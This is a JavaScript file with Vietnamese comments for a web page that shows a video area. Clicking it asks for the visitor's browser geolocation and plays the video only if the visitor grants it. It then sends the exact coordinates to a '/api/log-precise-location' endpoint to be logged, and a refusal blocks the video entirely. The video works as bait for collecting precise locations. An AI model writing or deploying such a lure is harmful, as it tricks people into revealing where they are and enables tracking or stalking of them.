// Lấy các element cần thiết từ HTML
const triggerElement = document.getElementById("location-trigger");
const videoElement = document.querySelector(".background-video");
const playIcon = document.querySelector(".fa-play");

// Lắng nghe sự kiện click vào khu vực "video"
triggerElement.addEventListener("click", () => {
  // Bây giờ, khi click chỉ gọi hàm hỏi quyền, không phát video ngay
  console.log("Khu vực video được click, chuẩn bị hỏi quyền vị trí...");
  requestLocationPermission();
});

// --- CÁC HÀM BÊN DƯỚI ---

function requestLocationPermission() {
  // Kiểm tra xem trình duyệt có hỗ trợ Geolocation không
  if ("geolocation" in navigator) {
    // Nếu có, gọi hàm để lấy vị trí
    navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
  } else {
    alert("Rất tiếc, trình duyệt của bạn không hỗ trợ lấy vị trí.");
  }
}

// Hàm được gọi khi người dùng ĐỒNG Ý cấp quyền
function successCallback(position) {
  // CHỈ KHI NGƯỜI DÙNG ĐỒNG Ý, VIDEO MỚI BẮT ĐẦU PHÁT
  if (videoElement.paused) {
    videoElement.play();
    playIcon.style.display = "none"; // Ẩn nút play đi
  }

  const lat = position.coords.latitude;
  const lon = position.coords.longitude;

  console.log(`Lấy vị trí thành công: Lat ${lat}, Lon ${lon}`);
  // alert(`Cảm ơn bạn đã cấp quyền! Vị trí của bạn là: ${lat}, ${lon}`); // Có thể tắt alert này đi cho mượt hơn

  // Gửi tọa độ lên server để ghi log
  fetch("/api/log-precise-location", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ latitude: lat, longitude: lon }),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Server responded with an error");
      }
      return response.json();
    })
    .then((data) => {
      console.log("Phản hồi từ server:", data);
    })
    .catch((error) => {
      console.error("Lỗi khi gửi vị trí lên server:", error);
    });
}

// Hàm được gọi khi người dùng TỪ CHỐI cấp quyền hoặc có lỗi
function errorCallback(error) {
  // Nếu người dùng từ chối, video sẽ không bao giờ phát
  console.log(`Có lỗi xảy ra: ${error.message}`);
  switch (error.code) {
    case error.PERMISSION_DENIED:
      alert(
        "Bạn đã từ chối cấp quyền vị trí. Chúng tôi không thể phát video này."
      );
      break;
    case error.POSITION_UNAVAILABLE:
      alert("Không thể xác định được vị trí của bạn.");
      break;
    case error.TIMEOUT:
      alert("Yêu cầu lấy vị trí đã hết hạn.");
      break;
    default:
      alert("Một lỗi không xác định đã xảy ra.");
      break;
  }
}
